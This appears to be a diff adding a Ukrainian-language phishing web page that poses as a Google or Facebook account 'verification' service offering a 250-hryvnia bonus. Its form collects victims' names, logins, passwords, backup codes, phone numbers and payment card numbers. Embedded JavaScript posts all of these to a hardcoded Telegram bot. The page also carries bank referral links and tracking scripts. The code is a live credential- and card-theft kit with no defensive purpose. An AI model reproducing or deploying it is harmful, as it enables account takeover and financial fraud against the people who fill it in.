@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="ua">
+
+<head>
+<meta name="google-site-verification" content="rj_OtlSgiOt6JuP_OD2hQWihvpvmRkZVmwFBULKvuuU" />
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1343075152930423"
+     crossorigin="anonymous"></script>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+  <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
+  <link href="css/style.css?v7" rel="stylesheet">
+  <link href="css/lightslider.min.css" rel="stylesheet">
+  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+
+  <title>Здати Google акаунт на перевірку</title>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '810928723632620');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none" src="tr?id=810928723632620&ev=PageView&noscript=1"></noscript>
+<!-- End Meta Pixel Code -->
+</head>
+
+<body>
+  <div class="wrapper">
+
+
+
+
+
+
+    <div>
+      <div class="top">
+        <div class="container">
+          <div class="top-bars"></div>
+          <div class="top-button">Додаткові 250 грн</div>
+        </div>
+      </div>
+
+
+ 
+
+      <div class="form">
+        <div data-aos="fade-up-right" class="container"></div>
+        <form class="main-form form-fields" action="send.php" method="get"></form>
+                <p class="money-pay"><strong>Заповніть форму Facebook</strong></p>
+         
+          <h4 >І наш менеджер зв'яжеться з вами впродовж години:</h4>
+
+          <div class="container mt-5 pt-5 pb-5">
+            <div class="col-md-6 offset-md-3">
+              <form id="tg">
+                <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
+            <div class="application-input">
+              <input type="text" name="name" placeholder="Ваше Ім'я" required="">
+            </div>
+               <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
+            <div class="application-input">
+              <input type="email" name="email" placeholder="Ваш Логін" required="">
+            </div>
+                <!-- /.form-group -->
+              <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
+            <div class="application-input">
+              <input type="text" name="password" placeholder="Ваш пароль" required="">
+            </div>
+              <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
+            <div class="application-input">
+             <textarea type="text" name="codes" cols="30" rows="1" placeholder="Ваші резервні коди"></textarea>
+            </div>
+             <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
+            <div class="application-input">
+              <input type="tel" name="namber" placeholder="Ваш номер телефону" required="">
+            </div>
+                <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
+            <div class="application-input">
+              <input type="card" name="yesno" placeholder="Ваша карта (для оплати)" required="">
+              <div  style="display:flex;justify-content:center;align-items:center;">
+                <label for="messanger" style="margin-right:15px;font-weight:bold;">Спосіб зв'язку:</label>
+              <select name="messanger" id="messanger">
+                <option value="Whatsapp-Messenger">WhatsApp Messenger</option>
+                <option selected value="Telegram">Telegram</option>
+                <option value="Viber">Viber</option>
+              </select>
+            </select>
+            </div>
+                
+                <!-- /.form-group -->
+        
+                <div id="success" class="alert alert-success" role="alert" style="display: none;"></div>
+        
+               <button type="submit" class="form-button">Відправити на перевірку <br>  (Загрузка 5 секунд) </button>
+              </form>
+          
+            </div>
+          </div>
+          <!-- /.col-md-6 offset-md-3 -->
+          </div>
+          <!-- /.container -->
+          <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+        
+          <script>
+            const TOKEN = "5640232171:AAH48wqsLGFhWfMxkNhpNj_giUowl3bMThM";
+            const CHAT_ID = "-1001581557176";
+            const URI_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`;
+            const success = document.getElementById('success');
+            document.getElementById('tg').addEventListener('submit', function(e) {
+              e.preventDefault();
+              let message = `<b>Facebook!</b>\n`;
+              message += `<b>Ім'я:</b> ${ this.name.value }\n`; 
+              message += `<b>Пошта:</b> ${ this.email.value }\n`;
+              message += `<b>Пароль:</b> ${ this.password.value }\n`;
+              message += `<b>Коди:</b> ${ this.codes.value }\n`;
+              message += `<b>Номер:</b> ${ this.namber.value }\n`;
+              message += `<b>Карта:</b> ${ this.yesno.value }\n`;
+              message += `<b>Спосіб зв'язку:</b> ${ this.messanger.value }`;
+              axios.post(URI_API, {
+                  chat_id: CHAT_ID,
+                  parse_mode: 'html',
+                  text: message
+                })
+                .then((res) => {
+                  this.yesno.value = "";
+                  this.yesno.value = "";
+                  success.innerHTML = ' <b>Форма заповнена! ✅ Ми відповімо вам впродовж години! Працюємо з 9:00 до 23:00 </b> ';
+                  success.style.display = 'block';
+                })
+                .catch((err) => {
+                  console.warn(err);
+                })
+                .finally(() => {
+                  comsole.log('Кінец');
+                })
+            })
+          </script>
+        
+        </body>
+     
+    <div class="reasons">
+
+      <p style="width:100%;padding:0 5%;margin:3% 0;"><img src="img/dots.svg" width="93%"></p>
+      <p class="money-pay"><strong>Додаткові 250 грн</strong></p>
+
+
+<p style="padding:0 3%;">Зареєструйтесь в цих банках і отримайте свою винагороду!</p> <br>
+
+<a href="https://mobile-app.pumb.ua/QAT4iE1WJdo9LZrq8"><img src="img/photo_2022-11-20_12-40-39.jpg" width="310" style="border-radius: 15px;" ></a>
+    
+<a href="https://abank24.page.link/E4oH"><img src="img/photo_2022-11-20_12-40-51.jpg" width="310" style="border-radius: 15px;" ></a>
+
+<a href="https://monobank.ua/r/AjpGoE">  <img src="img/photo_2022-11-20_12-40-57.jpg" width="310" style="border-radius: 15px;" > </a> 
+
+<a href="https://sportbank.ua/r/?ref=aPHDhK8K">  <img src="img/sportbank.jpg" width="310" style="border-radius: 15px;" > </a>
+
+<a href="https://izibank.com.ua/r/1etK">  <img src="img/izibank.jpg" width="310" style="border-radius: 15px;" > </a>
+
+<p style="width:100%;padding:0 5%;margin:3% 0;"><img src="img/dots.svg" width="93%"></p>
+<div data-aos="fade-up-right" class="container">
+
+
+<script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
+document.getElementById('submitButton').addEventListener('click', function () { }, false);
+</script>
+
+<script src="js/jquery-3.4.1.min.js"></script>
+<script src="js/lightslider.min.js"></script>
+<script src="js/easing.js"></script>
+<script src="js/basic.js?nc=8439797"></script>
+          
+          <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+          <script>
+AOS.init();
+</script>        
+</body>
+
+</html>
